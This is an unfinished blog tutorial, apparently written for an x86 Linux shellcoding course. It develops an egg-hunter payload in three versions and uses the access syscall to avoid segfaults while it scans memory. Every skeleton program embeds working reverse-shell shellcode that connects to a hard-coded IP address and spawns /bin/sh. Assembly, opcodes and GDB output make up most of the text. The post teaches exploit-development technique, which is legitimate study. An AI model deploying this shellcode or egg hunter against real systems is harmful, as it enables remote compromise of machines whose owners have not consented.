---
title: Egg Hunter
author: Stipe Marinovic
date: 2020-06-09 22:00:00 +0800
categories: [Blogging, Tutorial]
tags: [slae, shellcoding]
toc: true
---

** PAGE STILL UNDER CONSTRUCTION **

## Introduction ##

Egg Hunter is super useful and simple piece of code used to search for an defined series of bytes called "egg" in a memory. Egg as such is just a 4 bytes string, usually: "w00t" (but it can be anything else unique) which is added twice as prefix to a shellcode and thus marks beggining of a shell code.  
Egg Hunter is used in situation when buffer overflow vulnerability provides limited space, not large enough for placing shell code, but still shell code ends up somehow, somewhere in a memory.  
For example, HTTP header can be vulnerable to buffer overflow but useful buffer is not large enought to hold shell code so instead shell code can can be delivered as payload within POST parameters of the same request etc.   
Instead of direct execution of shellcode at first Egg Hunter is executed which searches for a egg in a memory and once it founds egg (two instances of egg: w00tw00t) it passes execution to a shellcode located just after the egg.  
Egg is appended twice as prefix to shell code in order to prevent Egg Hunter to find itself, meaning that egg is "w00t" but Egg Hunter is looking for two occurences of egg (w00t) one after another (w00tw00t). 

## Prototype ##

We could write Egg Hunter in pseudo code as follows:
```
egg = "w00t"                              # define egg
x = 0                                     # starting memory location 

While(True):                              # loop - which is running until 2 eggs are found
  if read(4 bytes at x) == egg:           # read 4 bytes and compare to egg (w00t)
    if read(4 bytes at x+4) == egg:       # if first 4 bytes are eaqual to egg, read next 4 bytes
      execute x+8                         # if another occurance of egg is found, pass execution to x+8 (shell code location)
  else:
    x = x+1                               # if egg isn't found, increase memory location +1 and try again
```

## Egg Hunter - first attempt ##

Let's write basic Egg Hunter in assembly code based on prototype and see what will happen. Once Egg Hunter is compiled and liked, we can use Egg Hunter opcode with sekelton code from previous blog posts.
In order for Egg Hunter to find and execute shell code (reverse shell code from previous blog post was used) we need to add two instances of egg ```\x77\x30\x30\x74``` at the beggining of shell code.

* Assemlby code is following:

```
global _start

_start:

XOR EDX, EDX                    ; clear EDX

NEXT_ADDRESS:                   ; label used for looping
  INC EDX                       ; increase EDX by 1

  CMP DWORD [EDX], 0x74303077   ; Compare 4 bytes with w00t
  JNZ SHORT NEXT_ADDRESS        ; if w00t not found, jump to NEXT_ADDRESS

  CMP dword [EDX+4], 0x74303077 ; if w00t found, compare next 4 bytes with w00t 
  JNZ SHORT NEXT_ADDRESS        ; if second w00t not found, jump to NEXT_ADDRESS

  ADD EDX, 0x8                  ; if two eggs are found, increase EDX + 8         
  JMP EDX                       ; jump to EDX + 8 address where shell code would be located

``` 

* Skeleton code with Egg Hunter and reverse shell is following:

```
#include <stdio.h>

unsigned char egghunter[] = "\x31\xd2\x42\x81\x3a\x77\x30\x30\x74\x75\xf7\x81\x7a\x04\x77\x30\x30\x75\xee\x83\xc2\x08\xff\xe2";
unsigned char shellcode[] = "\x77\x30\x30\x74\x77\x30\x30\x74\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x66\xb8\x67\x01\xb3\x02\xb1\x01\xb2\x06\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x6a\x01\x31\xc9\x51\x68\xc0\xa8\xc0\x9f\x66\x68\x11\x5c\x66\x6a\x02\x89\xfb\x89\xe1\xb2\x16\xcd\x80\x31\xc0\x31\xdb\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
// 1st egg -------------------^^^^^^^^^^^^^^^^^
// 2nd egg ------------------------------------^^^^^^^^^^^^^

int main()
{
        int (*ret)() = (int(*)())egghunter;
        printf("Size of egghunter: %d bytes.\n", sizeof(egghunter)); 
        ret();
}
```

Once compiled and run we get an segmentation fault at the very beggining of execution as shown on following screenshot and GDB output:

![segmentation fault](https://smarinovic.github.io/assets/img/slae_00015.png)

```
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x404040 --> 0x8142d231 
EBX: 0x404000 --> 0x3efc 
ECX: 0x0 
EDX: 0x1 
ESI: 0xb7fb8000 --> 0x1dfd6c 
EDI: 0xb7fb8000 --> 0x1dfd6c 
EBP: 0xbffff2b8 --> 0x0 
ESP: 0xbffff29c --> 0x4011d9 (<main+64>:        mov    eax,0x0)
EIP: 0x404043 --> 0x30773a81
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40403e:    add    BYTE PTR [eax],al
   0x404040 <egghunter>:        xor    edx,edx
   0x404042 <egghunter+2>:      inc    edx
=> 0x404043 <egghunter+3>:      cmp    DWORD PTR [edx],0x74303077
   0x404049 <egghunter+9>:      jne    0x404042 <egghunter+2>
   0x40404b <egghunter+11>:     cmp    DWORD PTR [edx+0x4],0x75303077
   0x404052 <egghunter+18>:     out    dx,al
   0x404053 <egghunter+19>:     add    edx,0x8
[------------------------------------stack-------------------------------------]
0000| 0xbffff29c --> 0x4011d9 (<main+64>:       mov    eax,0x0)
0004| 0xbffff2a0 --> 0x1 
0008| 0xbffff2a4 --> 0xbffff364 --> 0xbffff4e5 ("/root/repository/slae-exam/assignment03/egghunter1_exe")
0012| 0xbffff2a8 --> 0xbffff36c --> 0xbffff51c ("SHELL=/bin/bash")
0016| 0xbffff2ac --> 0x404040 --> 0x8142d231 
0020| 0xbffff2b0 --> 0xbffff2d0 --> 0x1 
0024| 0xbffff2b4 --> 0x0 
0028| 0xbffff2b8 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00404043 in egghunter ()
```

The reason we got segmentation fault is because our program is trying to access unalocated memory.  
We can verify this with following gdb command `x/1b 0x1` used to display one byte at given location 0x1:

```
gdb-peda$ x/1b 0x1
0x1:    Cannot access memory at address 0x1
gdb-peda$ 
```

To mitigate this issue, there are few possible solutions. Solution we will implement is based on ACCESS syscall.

## The access syscall ##

From the `man 2 access` pages we can see that access syscall takes two arguments and checks if calling process can access file pathname. 
At first it seams non usefull to us, but the thing is, access syscall can also accept memory address instead of file pathname and as such can verify if user can access memory location.  
Based on the return value (stored in EAX register), we can conclude whether program can access memory location without causing segmentation fault. 

```
int access(const char *pathname, int mode);
```

> access() checks whether the calling process can access the file pathname. If pathname is a symbolic link, it is dereferenced.
> access() and faccessat() may fail if: EFAULT pathname points outside your accessible address space.

So to succesfully use access, we need to monitor return value stored in EAX. If EAX is equal to -14 which is EFAULT then tested address cannot be accessible.

EFAULT is defined in `/usr/include/libr/sflib/common/sftypes.h` file and F_OK is defined in `/usr/include/unistd.h` file.
 that has code 14, or 0xf2 in negative form.

```
#define EFAULT          14      /* Bad address */
```

## Egg Hunter - second attempt ##

```
global _start

section .text
_start:

MOV EDI, 0x74303077 

XOR ECX, ECX                  ; clear ECX as ECX is used as second argument to access syscall
XOR EDX, EDX                  ; clear EDX as EDX will be used to store current address, starting with 0

NEXT_ADDRESS:                 ; label used for looping
  INC EDX                     ; increase EDX by 1 (next address)

XOR EAX, EAX                  ; clear EAX as EAX is used for access syscall number (0x21)
MOV AL, 0x21                  ; move access syscall number in EAX
LEA EBX, [EDX]                ; copy EDX address to EBX as first argument to access syscall
INT 0x80                      ; interrupt (syscall 0x21)
CMP AL, 0xF2                  ; compare access syscall result in EAX with 0xF2 which represent EFAULT
JZ SHORT NEXT_ADDRESS         ; if address is not accessible then jump to NEXT_ADDRESS         

CMP [EDX], EDI                ; if address is accessible then compare 4 bytes with w00t
JNZ SHORT NEXT_ADDRESS        ; if w00t is not found, jump to NEXT_ADDRESS

CMP [EDX+4], EDI              ; if w00t is found, compare next 4 bytes with w00t 
JNZ SHORT NEXT_ADDRESS        ; if second w00t is not found then jump to NEXT_ADDRESS

ADD EDX, 0x8                  ; if two eggs (w00tw00t) are found, increase ECX + 8         
JMP EDX                       ; jump to ECX + 8 address where shell code would be located
```

When we compile it, extract opcode and use opcode within following skeleton C code the Egg Hunter is working but unfortunately not every time. In some cases Egg Hunter crashes.
```
#include <stdio.h>

unsigned char egghunter[]= "\xbf\x77\x30\x30\x74\x31\xc9\x31\xd2\x42\x31\xc0\xb0\x21\x8d\x1a\xcd\x80\x3c\xf2\x74\xf3\x39\x3a\x75\xef\x39\x7a\x04\x75\xea\x83\xc2\x08\xff\xe2";
unsigned char shellcode[] = "\x77\x30\x30\x74\x77\x30\x30\x74\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x66\xb8\x67\x01\xb3\x02\xb1\x01\xb2\x06\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x6a\x01\x31\xc9\x51\x68\xc0\xa8\xc0\x9f\x66\x68\x11\x5c\x66\x6a\x02\x89\xfb\x89\xe1\xb2\x16\xcd\x80\x31\xc0\x31\xdb\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main()
{
        int (*ret)() = (int(*)())egghunter;
        printf("Size of egghunter: %d bytes.\n", sizeof(egghunter)); 
        ret();
}
```
  
By using GDB it can be concluded that checking access to only address stored in EDX is not always enough as current address in EDX can be accessible to Egg Hunter but EDX+8 address may not be accessible.  
To mitigate this issue we can verify if address from EDX is accessible and if address EDX+8 is also accessible.  
Next attempt...

```
global _start

section .text
_start:

MOV EDI, 0x74303077 

XOR ECX, ECX                  ; clear ECX - ECX is used as second argument to access syscall (0)
XOR EDX, EDX                  ; clear EDX - EDX will be used to store current address, starting with 0

NEXT_ADDRESS:                 ; label used for looping
  INC EDX                     ; increase EDX by 1

XOR EAX, EAX                  ; EAX is used for access syscall number (0x21)
MOV AL, 0x21                  ; move access syscall number in EAX
LEA EBX, [EDX]                ; move EDX address to EBX as first argument to access syscall
INT 0x80                      ; interrupt (syscall 0x21)
CMP AL, 0xF2                  ; compare access syscall result in EAX with 0xF2 which represent EFAULT
JZ SHORT NEXT_ADDRESS         ; if address not accessible jump to NEXT_ADDRESS         

XOR EAX, EAX                  ; EAX is used for access syscall number
MOV AL, 0x21                  ; access syscall number
LEA EBX, [EDX+8]              ; move EDX+8 address to EBX as first argument to access syscall
INT 0x80                      ; interrupt (syscall 0x21)
CMP AL, 0xF2                  ; check for EFAULT
JZ SHORT NEXT_ADDRESS         ; if not accessible jump to NEXT_ADDRESS         
              
CMP [EDX], EDI                ; if accessible then Compare 4 bytes with w00t
JNZ SHORT NEXT_ADDRESS        ; if w00t not found, jump to NEXT_ADDRESS

CMP [EDX+4], EDI              ; if w00t found, compare next 4 bytes with w00t 
JNZ SHORT NEXT_ADDRESS        ; if second w00t not found, jump to NEXT_ADDRESS

ADD EDX, 0x8                  ; if two eggs are found, increase ECX + 8         
JMP EDX                       ; jump to ECX + 8 address where shell code would be located
```

Now everyting works fine, reverse shell code is found by Egg Hunter and (reverse) shell code is executed. 

![egghunter2 works](https://smarinovic.github.io/assets/img/slae_00016.png)

Finding an egg with this Egg Hunter takes time and it has impact on performance which is seen when we look at CPU utilization (98.3%).

![cpu utilization](https://smarinovic.github.io/assets/img/slae_00020.png)

According to resources listed in last chapter, Linux memory is splited into pages. Page size is 4096 bytes.
If one address from the page is not accessible, all other addresses form the same page are also not accessible. 
So in order to speed up egghunter we could test if any address from page is accessible and if it is not we can skip to another page which saves us 4095 access attempts per page.

## Egg Hunter - third and final attempt ##

```
global _start

section .text
_start:

MOV EDI, 0x74303077           ; place egg in EDX
XOR ECX, ECX                  ; clear ECX as ECX will be used as second argument to syscall
XOR EDX, EDX                  ; clear EDX as EDX will be used as to hold current address

NEXT_PAGE:
  OR DX, 0xFFF                ; dx=4095 ; 0x1000 - 1 (4095) ; Page sizes in Linux x86 = 4096

NEXT_ADDRESS:                 ; label used for looping
  INC EDX                     ; increase EDX by 1

XOR EAX, EAX                  ; EAX is used for access syscall number
MOV AL, 0x21                  ; access syscall number 0x21
LEA EBX, [EDX+8]              ; check if EDX+8 is accessible
INT 0x80                      ; interrupt (syscall 0x21)

CMP AL, 0xF2                  ; check for EFAULT
JZ NEXT_PAGE                  ; if not accessible jump to NEXT_PAGE         

CMP [EDX], EDI                ; if address is accessible then compare 4 bytes with egg stored in EDI
JNZ NEXT_ADDRESS              ; if egg is not found, jump to NEXT_ADDRESS

CMP [EDX+4], EDI              ; compare next 4 bytes with egg 
JNZ NEXT_ADDRESS              ; if second egg is not found, jump to NEXT_ADDRESS

ADD EDX, 0x8                  ; if two eggs are found, increase EDX + 8 (to skip two eggs)
JMP EDX                       ; jump to EDX + 8 address where shell code would be located

```
opcode: `"\xbf\x77\x30\x30\x74\x31\xc9\x31\xd2\x66\x81\xca\xff\x0f\x42\x31\xc0\xb0\x21\x8d\x5a\x08\xcd\x80\x3c\xf2\x74\xed\x39\x3a\x75\xee\x39\x7a\x04\x75\xe9\x83\xc2\x08\xff\xe2"`

skeleton code:
```
#include <stdio.h>

unsigned char egghunter[] = "\xbf\x77\x30\x30\x74\x31\xc9\x31\xd2\x66\x81\xca\xff\x0f\x42\x31\xc0\xb0\x21\x8d\x5a\x08\xcd\x80\x3c\xf2\x74\xed\x39\x3a\x75\xee\x39\x7a\x04\x75\xe9\x83\xc2\x08\xff\xe2";
unsigned char shellcode[] = "\x77\x30\x30\x74\x77\x30\x30\x74\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x66\xb8\x67\x01\xb3\x02\xb1\x01\xb2\x06\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x6a\x01\x31\xc9\x51\x68\xc0\xa8\xc0\x9f\x66\x68\x11\x5c\x66\x6a\x02\x89\xfb\x89\xe1\xb2\x16\xcd\x80\x31\xc0\x31\xdb\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main()
{
        int (*ret)() = (int(*)())egghunter;
        printf("Size of egghunter: %d bytes.\n", sizeof(egghunter)); 
        ret();
}
```

`gcc -fno-stack-protector -z execstack -m32 skeleton3.c -o egghunter3_exe`

And it works.. 

![egghunter 3 - final version](https://smarinovic.github.io/assets/img/slae_00017.png)

## Wrapper ## 

In order to make Egg Hunter configurable to various shell codes and eggs we can use follwing pyhon script:



.... stil under construction ....


## References ##

* [Skape - Safely Searching Process Virtual Address Space](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf)
* [Corlean - exploit writing tutorial](https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/)
* [Art from code blog](https://artfromcode.wordpress.com/2018/03/23/slae-assignment-3-the-egg-hunter/)
* [IllegalBytes blog](https://illegalbytes.com/2018-03-20/slae-assignment-3-linux-x86-egghunting/)
* [Coffeegist blog](https://coffeegist.com/security/slae-exam-3-egg-hunter-shellcode/)
* [Ryuke Ackerman's blog](https://medium.com/@ryukeackerman/securitytube-linux-assembly-expert-slae-assignment-writeups-x03-egg-hunter-shellcode-ea53bf7a12eb)
